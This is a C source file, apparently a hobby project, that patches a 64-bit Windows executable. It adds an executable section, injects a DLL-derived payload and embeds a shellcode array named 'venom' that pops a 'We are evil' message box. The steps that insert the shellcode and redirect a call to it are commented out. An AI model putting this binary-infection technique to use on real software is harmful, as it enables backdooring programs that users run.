#include "ExeParser.h"
#include "ElfParser.h"
#include "AsmParser.h"
#include "JumpTableParser.h"
#include "ExeEditor.h"
#include "Instruction.h"
#include "BuildPayload.h"
#include "../lib/xed/includes/xed-interface.h"
#include "stdbool.h"
#include "stdio.h"
#include "stdlib.h"
#include "assert.h"
#include "string.h"

#include "PayloadStructure.h"

void get_all_info_from_exe(const char* exe_filename, 
        unsigned int max_instruction_count,
        unsigned int max_jump_function_count,
        ExeInfo** out_exe_info, 
        AsmParserState** out_asm_state,
        JumpTable** out_jump_table) {
    char* objdump_complete_filename = malloc(strlen(exe_filename) - strlen(".exe") + strlen("_objdump_complete.asm") + 1);

    memcpy(objdump_complete_filename, exe_filename, strlen(exe_filename) - strlen(".exe"));
    memcpy(objdump_complete_filename + strlen(exe_filename) - strlen(".exe"), "_objdump_complete.asm", strlen("_objdump_complete.asm") + 1);

    printf("new objdump: %s\n", objdump_complete_filename);

    ExeInfo* exe_info = exe_get_info(exe_filename);

    // objdump -b binary -m i386:x86-64 -D temp.bin > something.asm
    char* objdump_command_str = malloc(sizeof(char) * 512);
    snprintf(objdump_command_str, 512, "objdump -j .text -m i386:x86-64 -D %s > %s", exe_filename, objdump_complete_filename); // TODO(TeYo): filanames are not allowed to contain spaces
    system(objdump_command_str);

    printf("TESTING\n");
    AsmParserState* asm_state = build_asm_parser_state(exe_info->raw_text_code, exe_info->text_section->SizeOfRawData, max_instruction_count);
    parse_asm(asm_state);
    
    JumpTable* jump_table = build_jump_table(exe_info, max_jump_function_count);

    if (out_exe_info != NULL) {
        *out_exe_info = exe_info;
    } else {
        free_exe_info(exe_info);
    }
    if (out_asm_state != NULL) {
        *out_asm_state = asm_state;
    } else {
        free_asm_state(asm_state);
    }
    if (out_jump_table != NULL) {
        *out_jump_table = jump_table;
    } else {
        free_jump_table(jump_table);
    }
}

void print_asm_instruction(AsmParserState* asm_state, unsigned int index, unsigned int entry_point_address) {
    xed_decoded_inst_t* inst = &asm_state->decoded_instructions[index];
    unsigned int length_bytes = asm_state->instruction_lengths[index];
    xed_iclass_enum_t iclass = xed_decoded_inst_get_iclass(inst);
    unsigned int ptr = asm_state->binary_instruction_pointers[index];
    
    printf("0x");
    for (int i = 0; i < length_bytes; i++) {
        printf("%1x", asm_state->binary_instructions[ptr + i]);
    }
    printf(" | %s: length: %u, ptr: 0x%x\n", xed_iclass_enum_t2str(iclass), length_bytes, ptr);

    uint8_t opcode = *(uint8_t*)(asm_state->binary_instructions + ptr);
    switch (opcode) {
        case 0xe8: {
            break;
            if (length_bytes != 5) {
                printf("ERROR: Impossible instruction length\n");
                exit(1);
            }
            int32_t disp32 = *(int32_t*)(asm_state->binary_instructions + ptr + 1);
            int32_t target = asm_state->text_file_offset + ptr + length_bytes + disp32;
            printf("current ptr (relative): 0x%" PRIx32 "\n", ptr);
            printf("current ptr (absolute): 0x%" PRIx32 "\n", asm_state->text_file_offset + ptr);
            printf("disp32: 0x%" PRIx32 "\n", disp32);
            printf("target: 0x%" PRIx32 "\n", target);
        } break;
        case 0xff: {
            uint8_t rm_byte = *(int8_t*)(asm_state->binary_instructions + ptr + 1);
            if (rm_byte == 0x15) {
                if (length_bytes != 6) {
                    printf("ERROR: Impossible instruction length\n");
                    exit(1);
                }
                uint32_t disp32 = *(uint32_t*)(asm_state->binary_instructions + ptr + 2);
                uint32_t target = asm_state->text_file_offset + ptr + length_bytes + disp32;
                int64_t target_rel = (int64_t)entry_point_address - (int64_t)target;
                target_rel *= -1;
                printf("current ptr (relative): 0x%" PRIx32 "\n", ptr);
                printf("current ptr (absolute): 0x%" PRIx32 "\n", asm_state->text_file_offset + ptr);
                printf("disp32: 0x%" PRIx32 "\n", disp32);
                printf("target: 0x%" PRIx32 "\n", target);
                printf("target (entry point relative): %" PRId64 "\n", target_rel / 64);
            } else {
                //printf("WARNING: Unsupported instruction rm byte\n");
            }
        } break;
        default: break;
    }
}

JumpFunction* find_printf_jump_func(JumpTable* jump_table) {
    for (unsigned int i = 0; i < jump_table->jump_function_count; i++) {
        JumpFunction* func = &jump_table->jump_functions[i];
        if (strcmp(func->from_dll->function_names[func->function_index], "fprintf") == 0) {
            return func;
        }
    }
    return NULL;
}

unsigned int find_printf_call(AsmParserState* asm_state, JumpFunction* printf_jump_func) {
    for (unsigned int i = 0; i < asm_state->decoded_instructions_count; i++) {
        xed_decoded_inst_t* inst = &asm_state->decoded_instructions[i];
        unsigned int ptr = asm_state->binary_instruction_pointers[i];
        xed_iclass_enum_t iclass = xed_decoded_inst_get_iclass(inst);
        if (iclass == XED_ICLASS_CALL_NEAR) {
            uint8_t opcode = *(uint8_t*)(asm_state->binary_instructions + ptr);
            if (opcode == 0xe8) {
                int32_t disp32 = *(int32_t*)(asm_state->binary_instructions + ptr + 1);
                unsigned int length_bytes = asm_state->instruction_lengths[i];
                int32_t target_va = ptr + length_bytes + disp32;
                if (target_va == printf_jump_func->jump_address) {
                    return i;
                }
            }
        }
    }

    printf("ERROR: Couldn't find printf call\n");
    exit(1);
    return 0;
}

/*
void find_all_calls_to(AsmParserState* asm_state, JumpTable* jump_table, const char* func_name) {
    JumpFunction* jump_func = find_jump_func(jump_table, func_name);
    if (jump_func == NULL) {
        printf("ERROR: There is no such function within the jump table\n");
        exit(1);
    }

    for (unsigned int i = 0; i < asm_state->decoded_instructions_count; i++) {
        xed_decoded_inst_t* inst = &asm_state->decoded_instructions[i];
        unsigned int ptr = asm_state->binary_instruction_pointers[i];
        xed_iclass_enum_t iclass = xed_decoded_inst_get_iclass(inst);
        uint8_t opcode = *(uint8_t*)(asm_state->binary_instructions + ptr);
        if (iclass == XED_ICLASS_CALL_NEAR && opcode == 0xe8) {
            int32_t disp32 = *(int32_t*)(asm_state->binary_instructions + ptr + 1);
            unsigned int length_bytes = asm_state->instruction_lengths[i];
            int32_t target_va = ptr + length_bytes + disp32;
            if (target_va == jump_func->jump_address) {
                printf("\'%s\' call %u to 0x%" PRIx32 " at 0x%" PRIx32 "\n", func_name, i, 
                        asm_state->text_file_offset + target_va,
                        asm_state->binary_instruction_pointers[i]);
            } 
        }
    }
}
*/

void zero_init(char* data, unsigned int size) {
    for (unsigned int i = 0; i < size; i++) {
        data[i] = '\0';
    }
}

void print_hex(const char* data, unsigned int data_length) {
    printf("0x");
    for (unsigned int i = 0; i < data_length; i++) {
        printf("%" PRIx8 " ", (uint8_t)data[i]);
    }
    printf("\n");
}

// NOTE(TeYo): YES! I found the formula after like 10 hours: disp32 = dest_sec_va - src_sec_va - ptr - 7
// NOTE(TeYo): Technically the above formula doesn't always work, the actual formula is just the virtual address of the instruction pointer minus the va of the destination

void test_lea(unsigned int ptr, ExeInfo* exe_info) {
    unsigned int dest_sec_va = exe_info->all_sections[2]->VirtualAddress;
    unsigned int src_sec_va = exe_info->all_sections[0]->VirtualAddress;
    unsigned int dest_sec_fo = exe_info->all_sections[2]->PointerToRawData;
    unsigned int src_sec_fo = exe_info->all_sections[0]->PointerToRawData;
    unsigned int dest_va = dest_sec_va + 0x200;
    unsigned int dest_fo = 0x2200;
    unsigned int src_va = exe_info->text_section->VirtualAddress + ptr;

    // 0x2200 - 0x1825 = 0x9db
    int disp32 = dest_sec_va - src_sec_va - ptr - 7;
    printf("disp32: 0x%" PRIx32 "\n", disp32);
}

// TODO(TeYo): code up an absolute_jmp builder, then finish this project up [:

int main() {
unsigned char venom[] = 
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x3e\x48"
"\x8d\x8d\x25\x01\x00\x00\x41\xba\x4c\x77\x26\x07\xff\xd5"
"\x49\xc7\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x0e\x01\x00"
"\x00\x3e\x4c\x8d\x85\x1a\x01\x00\x00\x48\x31\xc9\x41\xba"
"\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2"
"\x56\xff\xd5\x57\x65\x20\x61\x72\x65\x20\x65\x76\x69\x6c"
"\x00\x4d\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x00\x75\x73"
"\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00";
    unsigned int VENOM_SIZE = sizeof(venom) / sizeof(unsigned char);

    ExeInfo* exe_info;
    AsmParserState* asm_state;
    JumpTable* jump_table;
    const unsigned int MAX_INSTRUCTION_COUNT = 4096 * 128;
    const unsigned int MAX_JUMP_FUNCTION_COUNT = 4096;
    const unsigned int NEW_SECTION_RAW_DATA_SIZE = 0x1000 * 100;
    const char* EXECUTABLE_FILENAME = "test/simple64.exe";
    const char* MODIFIED_EXECUTABLE_FILENAME = "test/modified64.exe";

    get_all_info_from_exe(
            EXECUTABLE_FILENAME, 
            MAX_INSTRUCTION_COUNT,
            MAX_JUMP_FUNCTION_COUNT,
            &exe_info, 
            &asm_state,
            &jump_table);

    jump_table_find_references(exe_info, asm_state, jump_table);

    //print_jump_table(jump_table);

    FILE* fd = fopen(EXECUTABLE_FILENAME, "r");   

    char* data = malloc(exe_info->file_size);
    read_file(fd, exe_info->file_size, &data);
    ModTable* mod_table = build_mod_table(data, exe_info->file_size, 8, 8, 8);

    if (!can_push_back_new_section(exe_info, fd)) {
        printf("WARNING: Cannot safely push back new section, information might be overwritten\n");
    }

    char* payload_buffer = calloc(1, NEW_SECTION_RAW_DATA_SIZE);
    SectionBuildInfo new_section = {
        .name = ".pvml",
        .data = payload_buffer,
        .data_size = NEW_SECTION_RAW_DATA_SIZE,
        .characteristics = IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE | IMAGE_SCN_CNT_INITIALIZED_DATA
    };
    IMAGE_SECTION_HEADER* new_header = build_new_section_push_back(exe_info, &new_section, 0, 0);    
    
    unsigned int processor_count = 1;
    unsigned int* processor_entry_points = malloc(sizeof(unsigned int) * processor_count);

    /*
    // put venom in payload
    {
        printf("VENOM SIZE: %u\n", VENOM_SIZE);
        memcpy(payload_buffer, venom, VENOM_SIZE);
    }
    */

    // put processor in payload
    unsigned int entry_point_offset = 0;
    {
        entry_point_offset = build_single_processor(payload_buffer, "build/Process.dll", "fputs_payload");
    }

    /*
    // change call to jump instruction
    {
        unsigned int call_inst_idx = 1607;
        InstructionInfo* inst = build_jump_near(exe_info->text_section,
                asm_state->binary_instruction_pointers[call_inst_idx],
                new_header->VirtualAddress + entry_point_offset);
        unsigned int clearing_length = get_necessary_clearing_length(asm_state, call_inst_idx, sizeof(Instruction_RegJump));
        
        add_instruction(mod_table, inst);
        add_nops(mod_table, 
                exe_info->text_section->PointerToRawData + asm_state->binary_instruction_pointers[call_inst_idx] + sizeof(Instruction_RegJump), 
                clearing_length - sizeof(Instruction_RegJump));
        
        printf("clearing length: %u\n", clearing_length);
        print_hex(inst->raw_data, inst->data_length);
    }
    */

    section_push_back(exe_info, mod_table, &new_section, new_header);

    // finish up executable
    fclose(fd);
    fd = fopen(MODIFIED_EXECUTABLE_FILENAME, "w");
    use_mod_table(mod_table, fd);
    fclose(fd);
    unsigned int new_file_size = get_file_size(MODIFIED_EXECUTABLE_FILENAME);
    fd = fopen(MODIFIED_EXECUTABLE_FILENAME, "r");
    char* new_data = malloc(new_file_size);
    read_file(fd, new_file_size, &new_data);
    clear_mod_table(mod_table, new_data, new_file_size);
    fclose(fd);
    fix_checksum(MODIFIED_EXECUTABLE_FILENAME, mod_table);
    fd = fopen(MODIFIED_EXECUTABLE_FILENAME, "w");
    use_mod_table(mod_table, fd);
    fclose(fd);
    
    char* objdump_command_str = malloc(sizeof(char) * 512);
    snprintf(objdump_command_str, 512, "objdump -j .text -m i386:x86-64 -D %s > %s",
            MODIFIED_EXECUTABLE_FILENAME, "test/modified64_objdump_complete.asm");
    system(objdump_command_str);

    printf("FINISHED\n");

    return 0;
}
